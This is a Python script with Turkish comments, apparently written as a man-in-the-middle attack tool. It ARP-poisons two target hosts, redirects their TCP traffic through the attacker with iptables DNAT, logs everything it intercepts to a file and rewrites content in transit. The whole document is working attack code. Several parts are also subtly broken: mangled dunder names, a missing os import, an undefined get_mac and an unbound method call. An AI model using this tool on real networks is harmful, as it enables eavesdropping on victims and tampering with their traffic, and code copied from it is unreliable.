from scapy.all import *
import threading
import netifaces as ni
import socket
import fcntl
import struct
import time
from argparse import ArgumentParser
from subprocess import call
from sys import exit as sysexit

# TCP Bayrakları
SYN = 0x02
ACK = 0x10

# Veri iletimi sonlandırıcılar
DATA_MESSAGE_END = b'\x1C\x0D'
DATA_TRANSMIT_END = 'ACK'

class MITMAttacker:
    def _init_(self, interface):
        self.interface = interface
        self.IP = self.get_ip_address(interface)
        self.pipe_dict = {}

    def get_ip_address(self, ifname):
        """
        Bir arayüzün IP adresini alır
        """
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', ifname[:15])
        )[20:24])

    def restore_network(self, A_IP, A_MAC, B_IP, B_MAC):
        """
        ARP tablolarını orijinal yapıya geri getirir
        """
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=A_IP, hwsrc=B_MAC, psrc=B_IP), count=5, iface=self.interface)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=B_IP, hwsrc=A_MAC, psrc=A_IP), count=5, iface=self.interface)

    def arp_poison(self, A_IP, A_MAC, B_IP, B_MAC):
        """
        İki kurban için ARP tablolarını zehirler ve verileri kendi cihazına yönlendirir
        """
        try:
            while True:
                send(ARP(op=2, pdst=A_IP, hwdst=A_MAC, psrc=B_IP), iface=self.interface)
                send(ARP(op=2, pdst=B_IP, hwdst=B_MAC, psrc=A_IP), iface=self.interface)
                time.sleep(2)
        except KeyboardInterrupt:
            self.restore_network(A_IP, A_MAC, B_IP, B_MAC)

    def init_mitm_pipe(self, server_port, server_ip):
        """
        Belirtilen bağlantı noktasında dinleme yapan bir sunucu başlatır
        """
        listen_sock = self.start_server_listen(server_port)
        while True:
            connection, client_address = listen_sock.accept()
            print("Port %s üzerinden bağlantı kabul edildi" % server_port)
            send_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (server_ip, server_port)
            try:
                send_sock.connect(server_address)
                print("Sunucuya bağlanıldı %s:%s" % (server_ip, server_port))
            except:
                connection.close()
                continue
            try:
                self.pipe_data(connection, send_sock)
            finally:
                print("Pipe tamamlandı")
                connection.close()
                send_sock.close()

    def pipe_data(self, connection_a, connection_b):
        """
        Veriyi iki bağlantı arasında iletilir
        """
        while True:
            recv_data_a = self.recv_send_data(connection_a, connection_b)
            recv_data_b = self.recv_send_data(connection_b, connection_a)
            if DATA_TRANSMIT_END in recv_data_b or DATA_TRANSMIT_END in recv_data_a:
                break

    def recv_send_data(self, connection_a, connection_b):
        """
        Bir bağlantıdan gelen veriyi alır ve diğerine iletir
        """
        recv_data_a = b''
        temp_recv_data_a = connection_a.recv(4096)
        while DATA_MESSAGE_END not in temp_recv_data_a:
            recv_data_a += temp_recv_data_a
            temp_recv_data_a = connection_a.recv(4096)
        recv_data_a += temp_recv_data_a
        if recv_data_a:
            recv_data_a = recv_data_a.replace('Trump','Duck')
            with open('logfile.log','a') as log:
                log.write(recv_data_a)
                log.write('\n')
            connection_b.sendall(recv_data_a)
        return recv_data_a

    def start_server_listen(self, server_port):
        """
        Belirtilen bağlantı noktasında bir dinleme sunucusu başlatır
        """
        listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_address = (self.IP, server_port)
        listen_sock.bind(listen_address)
        listen_sock.listen(1)
        return listen_sock

    def setup_MITM(self, pkt):
        """
        SYN paketi gönderilirse MITM saldırısını başlatır
        """
        if TCP in pkt:
            if pkt[TCP].flags & SYN and not pkt[TCP].flags & ACK:
                if pkt[IP].src not in self.pipe_dict and pkt[IP].src != self.IP:
                    self.pipe_dict[pkt[IP].src] = threading.Thread(
                        target=self.init_mitm_pipe, args=(pkt[TCP].dport, pkt[IP].dst)
                    )
                    self.pipe_dict[pkt[IP].src].daemon = True
                    self.pipe_dict[pkt[IP].src].start()
                    call(("iptables -A PREROUTING -t nat -i %s -p tcp --src %s -j DNAT --to %s:%s" %
                          (self.interface, pkt[IP].src, self.IP, pkt[TCP].dport)
                          ).split(' '))

def main():
    """
    Ana program fonksiyonu
    """
    ap = ArgumentParser(
        description="Scapy ile belirtilen IP'ler üzerinde MITM saldırısı gerçekleştirir"
    )
    ap.add_argument("-i", "--interface", required=True,
                    help="Kullanılacak ağ arayüzü")
    ap.add_argument("-t", "--targets", required=True, nargs=2,
                    help="Hedef IP adresleri")
    args = vars(ap.parse_args())

    if not os.geteuid() == 0:
        sysexit("Root yetkisi ile çalıştırın")

    try:
        print("Başlatılıyor...")
        A_IP = args['targets'][0]
        B_IP = args['targets'][1]
        interface = args['interface']
        A_MAC = get_mac(A_IP, interface)
        B_MAC = get_mac(B_IP, interface)
        self_MAC = get_if_hwaddr(interface)
        self_IP = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']

        poison_thread = threading.Thread(target=MITMAttacker.arp_poison, args=(A_IP, A_MAC, B_IP, B_MAC))
        poison_thread.daemon = True
        poison_thread.start()
        mitm_attacker = MITMAttacker(interface)
        sn = sniff(iface=interface, prn=mitm_attacker.setup_MITM)
    except IOError:
        sysexit("Arayüz bulunamadı")
    except KeyboardInterrupt:
        call(("iptables -t nat -F PREROUTING").split(' '))
        print("\nDurduruluyor...")

if _name_ == "_main_":
    main()